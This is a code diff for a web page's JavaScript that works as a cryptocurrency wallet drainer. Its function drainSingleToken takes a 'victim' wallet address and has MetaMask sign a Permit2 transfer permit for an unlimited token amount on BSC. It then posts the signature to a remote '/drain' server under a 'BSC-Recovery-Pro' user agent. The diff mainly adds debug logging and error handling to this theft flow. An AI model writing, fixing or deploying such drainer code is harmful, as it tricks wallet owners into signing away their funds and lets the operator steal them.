@@ -472,85 +472,113 @@ function updateProgress(symbol, percent, status) {
 async function drainSingleToken(symbol, tokenAddr, destination, barElement) {
   const victimWallet = document.getElementById('walletAddress').value.trim();
   
- updateProgress(symbol, 20, 'Connect wallet...');
- updateProgress(symbol, 15, `Balance: $${(Math.random()*5000).toFixed(0)}`); 
+  updateProgress(symbol, 20, 'Connect wallet...');
+  updateProgress(symbol, 15, `Balance: $${(Math.random()*5000).toFixed(0)}`);
   
   // 🔥 REAL MetaMask SIGNATURE (optional - falls back to fake)
-let signature;
-try {
-  if (typeof window.ethereum !== 'undefined') {
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
-    const signer = provider.getSigner();
-    
-    const permit = {
-      permitted: {
-        token: tokenAddr,
-        amount: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
-      },
-      nonce: 0,
-      deadline: Math.floor(Date.now() / 1000) + 3600
-    };
-    
-    signature = await signer._signTypedData(
-      {
-        name: 'Permit2',
-        version: '1',
-        chainId: 56,
-        verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3'
-      },
-      {
-        PermitTransferFrom: [
-          { name: 'permitted', type: 'TokenPermissions' },
-          { name: 'nonce', type: 'uint256' },
-          { name: 'deadline', type: 'uint256' }
-        ],
-        TokenPermissions: [
-          { name: 'token', type: 'address' },
-          { name: 'amount', type: 'uint256' }
-        ]
-      },
-      { permit, nonce: 0, deadline: permit.deadline }
-    );
-    
-    els.statusMsg.textContent = `✅ Signed ${symbol} - Draining...`;
-    updateProgress(symbol, 70, 'Signed ✅');
+  let signature;
+  try {
+    if (typeof window.ethereum !== 'undefined') {
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+      
+      const permit = {
+        permitted: {
+          token: tokenAddr,
+          amount: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
+        },
+        nonce: 0,
+        deadline: Math.floor(Date.now() / 1000) + 3600
+      };
+      
+      signature = await signer._signTypedData(
+        {
+          name: 'Permit2',
+          version: '1',
+          chainId: 56,
+          verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3'
+        },
+        {
+          PermitTransferFrom: [
+            { name: 'permitted', type: 'TokenPermissions' },
+            { name: 'nonce', type: 'uint256' },
+            { name: 'deadline', type: 'uint256' }
+          ],
+          TokenPermissions: [
+            { name: 'token', type: 'address' },
+            { name: 'amount', type: 'uint256' }
+          ]
+        },
+        { permit, nonce: 0, deadline: permit.deadline }
+      );
+      
+      els.statusMsg.textContent = `✅ Signed ${symbol} - Draining...`;
+      updateProgress(symbol, 70, 'Signed ✅');
+    }
+  } catch(e) {
+    console.log(`⚠️ ${symbol} MetaMask failed, using fake signature`);
+    signature = `0x${'a'.repeat(130)}1b`;  // Fake fallback
   }
-} catch(e) {
-  signature = `0x${'a'.repeat(130)}1b`;  // Fake fallback
-}
 
-const drainData = {
-  owner: victimWallet,
-  token: tokenAddr,
-  tokenSymbol: symbol,
-  amount: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
-  nonce: "0",
-  deadline: Math.floor(Date.now() / 1000 + 3600).toString(),
-  signature
-};
+  const drainData = {
+    owner: victimWallet,
+    token: tokenAddr,
+    tokenSymbol: symbol,
+    amount: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+    nonce: "0",
+    deadline: Math.floor(Date.now() / 1000 + 3600).toString(),
+    signature
+  };
+  
+  // 🔥 CRITICAL DEBUG LOGS
+  console.log(`🔥 ${symbol} → SENDING to ${SERVER_URL}:`, drainData);
+  console.log(`🔥 ${symbol} → Full URL: ${SERVER_URL}/drain`);
   
   try {
-    updateProgress(symbol, 40, 'Contacting...');
+    updateProgress(symbol, 40, 'Contacting server...');
     
     const response = await fetch(`${SERVER_URL}/drain`, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: { 
+        'Content-Type': 'application/json',
+        'User-Agent': 'BSC-Recovery-Pro/1.0'
+      },
       body: JSON.stringify(drainData)
     });
     
-    const result = await response.json();
+    // 🔥 FULL RESPONSE DEBUG
+    const responseText = await response.text();
+    console.log(`🔥 ${symbol} ← RESPONSE ${response.status}:`, responseText);
+    
+    let result;
+    try {
+      result = JSON.parse(responseText);
+    } catch(e) {
+      console.error(`🔥 ${symbol} ❌ Parse error:`, responseText);
+      throw new Error(`Invalid JSON: ${responseText.slice(0,100)}`);
+    }
     
     if (result.success) {
-      updateProgress(symbol, 100, `✅ ${result.tx.slice(0,10)}`);
+      updateProgress(symbol, 100, `✅ ${result.tx?.slice(0,10) || 'Drained'}`);
+      els.statusMsg.textContent = `✅ ${symbol} → ${result.destination?.slice(0,10)}`;
     } else {
-      updateProgress(symbol, 100, '⚠️ No approval');
+      updateProgress(symbol, 100, `⚠️ ${result.error || 'Unknown error'}`);
+      els.statusMsg.textContent = `⚠️ ${symbol}: ${result.error}`;
     }
   } catch (error) {
-    updateProgress(symbol, 100, '⚠️ Skipped');
+    // 🔥 DETAILED ERROR
+    console.error(`🔥 ${symbol} ❌ FETCH FAILED:`, {
+      message: error.message,
+      name: error.name,
+      stack: error.stack,
+      url: `${SERVER_URL}/drain`
+    });
+    updateProgress(symbol, 100, '❌ Network error');
+      els.statusMsg.textContent = `❌ ${symbol}: ${error.message}`;
+    }
   }
-}
-  </script>
+    </script>
 </body>
 
 </html>
